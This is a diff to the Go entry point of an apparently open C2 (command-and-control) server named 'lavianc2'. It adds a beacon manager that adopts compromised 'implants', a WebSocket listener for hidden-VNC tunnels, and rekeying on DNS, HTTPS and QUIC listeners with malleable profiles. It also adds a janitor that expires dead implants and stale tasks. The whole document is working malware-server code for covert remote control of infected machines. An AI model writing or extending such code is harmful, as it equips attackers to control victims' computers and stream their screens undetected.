@@ -13,12 +13,15 @@ import (
 
 	"github.com/google/uuid"
 	"github.com/uLl0a/lavianc2/internal/api"
+	"github.com/uLl0a/lavianc2/internal/beacons"
 	"github.com/uLl0a/lavianc2/internal/config"
 	"github.com/uLl0a/lavianc2/internal/crypto"
 	"github.com/uLl0a/lavianc2/internal/events"
 	"github.com/uLl0a/lavianc2/internal/listeners"
 	"github.com/uLl0a/lavianc2/internal/models"
+	"github.com/uLl0a/lavianc2/internal/protocol"
 	"github.com/uLl0a/lavianc2/internal/profiles"
+	
 	"github.com/uLl0a/lavianc2/internal/sessions"
 	"github.com/uLl0a/lavianc2/internal/storage"
 	"github.com/uLl0a/lavianc2/internal/tasks"
@@ -67,8 +70,6 @@ func main() {
 	engine := tasks.NewEngine(store, registry, bus, log)
 	log.Info("motor de tareas inicializado")
 
-	go runStaleJanitor(ctx, store, bus, log)
-
 	profilesRegistry := profiles.NewRegistry()
 	log.Info("perfiles maleables cargados", "perfiles", profilesRegistry.List())
 
@@ -102,6 +103,7 @@ func main() {
 		serverKeys,
 		cfg.TLSCertFile,
 		cfg.TLSKeyFile,
+		cfg.RekeyEvery,
 		log,
 	)
 	if err != nil {
@@ -138,6 +140,7 @@ func main() {
 		registry,
 		bus,
 		serverKeys,
+		cfg.RekeyEvery,
 		log,
 	)
 	if err != nil {
@@ -178,6 +181,7 @@ func main() {
 		cfg.QUICProfile,
 		cfg.TLSCertFile,
 		cfg.TLSKeyFile,
+		cfg.RekeyEvery,
 		log,
 	)
 	if err != nil {
@@ -191,6 +195,55 @@ func main() {
 		}
 	}()
 	log.Info("listener QUIC activo", "addr", cfg.QUICAddr, "id", quicID)
+
+	// ---- Multi-Beacon Manager ----
+	// store.Implants actúa como lookup para adoptar implants reales como
+	// beacons gestionados (vinculación implant↔beacon).
+	beaconManager := beacons.NewManager(ctx, store.Beacons, store.Implants, bus, log)
+	beaconManager.Start(ctx)
+	log.Info("multi-beacon manager activo")
+
+	// ---- WS listener (túneles hVNC / streaming) ----
+	// La migración 0003 amplía listeners_type_check para aceptar
+	// 'websocket' de forma idempotente; sin ella este ensure falla con
+	// violación de check constraint.
+	wsID, err := ensureDefaultListener(
+		ctx, store,
+		"default-websocket",
+		models.ListenerType("websocket"),
+		cfg.WSAddr,
+		"",
+		log,
+	)
+	if err != nil {
+		log.Error("no se pudo asegurar listener WS en DB", "err", err)
+		os.Exit(1)
+	}
+	wsListener, err := listeners.NewWSListener(listeners.WSListenerConfig{
+		ID:       wsID,
+		Name:     "default-websocket",
+		BindAddr: cfg.WSAddr,
+		CertFile: cfg.TLSCertFile,
+		KeyFile:  cfg.TLSKeyFile,
+		Store:    store,
+		Log:      log,
+		Router:   protocol.NewRouter(log),
+		Manager:  beaconManager,
+	})
+	if err != nil {
+		log.Error("no se pudo crear listener WS", "err", err)
+		os.Exit(1)
+	}
+	wsCtx, wsCancel := context.WithCancel(ctx)
+	go func() {
+		if err := wsListener.Start(wsCtx); err != nil {
+			log.Error("WS listener detenido", "err", err)
+		}
+	}()
+	log.Info("listener WS activo", "addr", cfg.WSAddr, "id", wsID)
+
+	// El janitor necesita los listeners para purgar sus rekeys pendientes.
+	go runStaleJanitor(ctx, store, bus, log, dnsListener, httpsListener, quicListener)
 
 	// ---- gRPC admin API ----
 	apiServer, err := api.NewServer(api.Config{
@@ -206,6 +259,7 @@ func main() {
 		DNSProfiles:  dnsProfilesRegistry,
 		QUICProfiles: quicProfilesRegistry,
 		ServerKeys:   serverKeys,
+		BeaconMgr:    beaconManager,
 		RepoRoot:     ".",
 	}, log)
 	if err != nil {
@@ -237,6 +291,13 @@ func main() {
 	quicCancel()
 	_ = quicListener.Stop(shutdownCtx)
 	log.Info("listener QUIC detenido")
+
+	wsCancel()
+	_ = wsListener.Stop(shutdownCtx)
+	log.Info("listener WS detenido")
+
+	beaconManager.Stop()
+	log.Info("multi-beacon manager detenido")
 
 	apiServer.Stop()
 	log.Info("gRPC admin API detenida")
@@ -314,26 +375,39 @@ func parseBindAddr(bindAddr string) (string, int) {
 	return host, port
 }
 
+// rekeyExpirer agrupa los listeners que saben purgar sus rekeys pendientes.
+type rekeyExpirer interface {
+	ExpirePendingRekeys() []uuid.UUID
+}
+
 func runStaleJanitor(
 	ctx context.Context,
 	store *storage.Store,
 	bus *events.Bus,
 	log *slog.Logger,
+	expirers ...rekeyExpirer,
 ) {
 	t := time.NewTicker(time.Minute)
 	defer t.Stop()
+
+	// Una tarea 'sent' sin resultado tras este umbral es un zombi.
+	const taskStaleAfter = 10 * time.Minute
 
 	for {
 		select {
 		case <-ctx.Done():
 			return
 		case <-t.C:
+			// Rekeys pendientes expirados en cada listener.
+			for _, ex := range expirers {
+				for _, id := range ex.ExpirePendingRekeys() {
+					log.Warn("janitor: rekey pendiente expirado", "implant", id)
+				}
+			}
+
 			ids, err := store.Implants.MarkStaleAsDead(ctx)
 			if err != nil {
 				log.Error("janitor: mark stale dead", "err", err)
-				continue
-			}
-			if len(ids) == 0 {
 				continue
 			}
 			for _, id := range ids {
@@ -350,6 +424,26 @@ func runStaleJanitor(
 				bus.Publish(ctx, events.Event{
 					Topic:   events.TopicImplantDead,
 					Payload: id,
+				})
+			}
+
+			// Tareas zombis: 'sent' sin resultado tras el umbral.
+			zombies, err := store.Tasks.MarkStaleSentAsFailed(ctx, taskStaleAfter)
+			if err != nil {
+				log.Error("janitor: mark stale sent tasks", "err", err)
+			}
+			for _, taskID := range zombies {
+				log.Warn("tarea marcada como failed (zombi)",
+					"task", taskID,
+					"motivo", "despachada sin resultado",
+					"umbral", taskStaleAfter.String(),
+				)
+				bus.Publish(ctx, events.Event{
+					Topic: events.TopicTaskCompleted,
+					Payload: map[string]any{
+						"task_id": taskID,
+						"status":  models.TaskFailed,
+					},
 				})
 			}
 		}
